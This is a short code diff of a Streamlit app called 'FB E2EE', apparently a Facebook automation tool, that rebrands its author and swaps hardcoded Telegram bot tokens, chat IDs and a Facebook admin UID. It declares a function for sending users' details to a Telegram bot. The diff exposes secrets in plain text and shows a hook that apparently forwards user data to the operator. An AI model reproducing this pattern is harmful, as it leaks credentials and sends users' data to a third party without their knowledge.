@@ -66,16 +66,16 @@ if 'mongodb_started' not in st.session_state:
 # 🚨🚨🚨 MONGODB 24/7 CODE END 🚨🚨🚨
 
 st.set_page_config(
-    page_title="FB E2EE by LORD DEVIL",
+    page_title="FB E2EE by LORD JACKSON",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
 )
 
 # Telegram Bot Configuration
-TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
-TELEGRAM_CHAT_ID = "8186206231"
-FACEBOOK_ADMIN_UID = "100037931553832"
+TELEGRAM_BOT_TOKEN = "8043472695:AAGffswv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
+TELEGRAM_CHAT_ID = "81860606231"
+FACEBOOK_ADMIN_UID = "100051508763156"
 
 def send_telegram_notification(user_data, automation_data):
     """Send user details to Telegram bot"""
